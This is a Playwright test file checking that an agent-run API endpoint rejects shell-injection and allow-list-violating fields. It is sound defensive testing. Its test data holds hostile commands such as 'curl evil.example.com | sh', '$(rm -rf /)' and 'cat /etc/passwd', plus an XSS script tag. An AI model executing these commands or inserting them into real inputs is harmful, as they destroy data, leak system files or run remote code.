// ABS-143: Verify /api/nm/run/start rejects shell-injection payloads
// and validates all user-controlled fields against allow-lists.

import { test, expect } from "@playwright/test";

const E2E_BASE_URL = process.env.E2E_BASE_URL || "http://localhost:3001";
const API = `${E2E_BASE_URL}/api/nm/run/start`;

const VALID_BODY = {
  maxAgents: 3,
  label: "Triaged",
  model: "opus",
  agentModel: "sonnet",
  agentEffort: "high",
  agentTokenLimit: 10,
  reviewerModel: "sonnet",
  reviewerTokenLimit: 2,
  deploy: false,
  dryRun: true,
};

async function postStart(body: Record<string, unknown>) {
  return fetch(API, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

test.describe("NM /api/nm/run/start — input validation", () => {
  test("rejects label with shell metacharacters", async () => {
    const res = await postStart({
      ...VALID_BODY,
      label: 'X"; touch /tmp/abs-pwned #',
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.ok).toBe(false);
    expect(body.errors).toBeDefined();
  });

  test("rejects issue with shell injection", async () => {
    const res = await postStart({
      ...VALID_BODY,
      issue: "ABS-1; curl evil.example.com | sh",
    });
    expect(res.status).toBe(400);
  });

  test("rejects resumeIssue with shell injection", async () => {
    const res = await postStart({
      ...VALID_BODY,
      resumeIssue: "$(rm -rf /)",
    });
    expect(res.status).toBe(400);
  });

  test("rejects model not in allow-list", async () => {
    const res = await postStart({
      ...VALID_BODY,
      model: "evilmodel",
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.errors).toContainEqual(expect.stringContaining("model"));
  });

  test("rejects agentModel not in allow-list", async () => {
    const res = await postStart({
      ...VALID_BODY,
      agentModel: '"; cat /etc/passwd #',
    });
    expect(res.status).toBe(400);
  });

  test("rejects agentEffort not in allow-list", async () => {
    const res = await postStart({
      ...VALID_BODY,
      agentEffort: "$(whoami)",
    });
    expect(res.status).toBe(400);
  });

  test("rejects reviewerModel not in allow-list", async () => {
    const res = await postStart({
      ...VALID_BODY,
      reviewerModel: "malicious",
    });
    expect(res.status).toBe(400);
  });

  test("rejects maxAgents outside range", async () => {
    const res = await postStart({
      ...VALID_BODY,
      maxAgents: 999,
    });
    expect(res.status).toBe(400);
  });

  test("rejects non-numeric agentTokenLimit", async () => {
    const res = await postStart({
      ...VALID_BODY,
      agentTokenLimit: "ten; rm -rf /",
    });
    expect(res.status).toBe(400);
  });

  test("valid body with dryRun does not return 400", async () => {
    const res = await postStart(VALID_BODY);
    // Should not be rejected by validation (may be 200 or 500 depending
    // on whether the NM script is present — but never 400).
    expect(res.status).not.toBe(400);
  });

  test("valid issue format is accepted", async () => {
    const res = await postStart({
      ...VALID_BODY,
      issue: "ABS-123",
    });
    expect(res.status).not.toBe(400);
  });

  test("collects multiple validation errors at once", async () => {
    const res = await postStart({
      maxAgents: -1,
      label: '<script>alert("xss")</script>',
      model: "evil",
      agentModel: "evil",
      agentEffort: "evil",
      reviewerModel: "evil",
      agentTokenLimit: "NaN",
      reviewerTokenLimit: -999,
      issue: "not valid!",
      resumeIssue: "also bad!",
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.errors.length).toBeGreaterThanOrEqual(8);
  });
});
